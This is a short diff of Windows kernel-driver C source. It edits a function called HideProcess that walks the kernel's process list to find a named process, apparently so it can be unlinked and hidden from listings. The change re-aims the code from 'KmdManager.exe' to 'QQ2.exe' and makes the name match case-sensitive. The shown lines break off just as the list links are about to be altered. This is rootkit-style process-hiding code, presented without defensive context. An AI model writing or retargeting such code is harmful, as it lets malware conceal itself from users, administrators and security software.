@@ -27,7 +27,7 @@ VOID HideProcess()
 	PLIST_ENTRY head, currentNode, prevNode;
 	PEPROCESS eprocessStart;
 	unsigned char* currentProcess = NULL;
-	const char target[] = "KmdManager.exe";
+	const char target[] = "QQ2.exe";
 	ANSI_STRING targetProcessName, currentProcessName;
 	
 	eprocessStart = IoGetCurrentProcess();
@@ -39,7 +39,7 @@ VOID HideProcess()
 		currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
 		RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));
 
-		if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)
+		if (RtlCompareString(&targetProcessName, &currentProcessName, FALSE) == 0)
 		{
 			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Found target process %s.\n", target);
 			prevNode = currentNode->Blink;
